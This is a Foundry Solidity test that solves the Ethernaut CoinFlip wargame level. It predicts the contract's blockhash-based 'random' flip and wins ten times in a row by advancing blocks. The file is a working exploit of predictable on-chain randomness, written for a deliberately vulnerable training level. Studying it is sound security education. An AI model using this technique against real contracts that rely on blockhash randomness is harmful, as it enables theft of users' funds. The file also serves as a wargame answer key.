// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {CoinFlip} from "src/levels/CoinFlip.sol";
import {CoinFlipFactory} from "src/levels/CoinFlipFactory.sol";
import {CoinFlipAttack} from "src/attacks/CoinFlipAttack.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

contract TestCoinflipSolution is Test, Utils {
    Ethernaut ethernaut;
    CoinFlip instance;

    address payable owner;
    address payable player;

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    function setUp() public {
        address payable[] memory users = createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        player = users[1];
        vm.label(player, "Player");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        CoinFlipFactory factory = new CoinFlipFactory();
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = CoinFlip(
            createLevelInstance(ethernaut, Level(address(factory)), 0)
        );
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                                 TESTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Check the intial state of the level and enviroment.
    function testInit() public {
        vm.prank(player);
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
    }

    /// @notice Test the solution for the level.
    /// @dev run with: `forge test --mc TestCoinflipSolution -vvv`
    function testSolve() public {
        //goal: guess 10 times in a row

        // we can do the same logic as the contract since everything uses deterministic values

        // hardcoded Factor value
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        vm.startPrank(player);

        // loop this logic 10 times to pass the excercise
        for (uint256 i; i < 10; i++) {
            uint256 blockValue = uint256(blockhash(block.number - 1));

            uint256 coinFlip = blockValue / FACTOR;

            bool side = coinFlip == 1 ? true : false;
            instance.flip(side);
            // use roll for block number skip, and bypass lastHash == blockValue revert
            vm.roll(block.number + 1);
        }
        // check that loop guessed 10 times in a row
        assertEq(instance.consecutiveWins(), 10);
    }
}
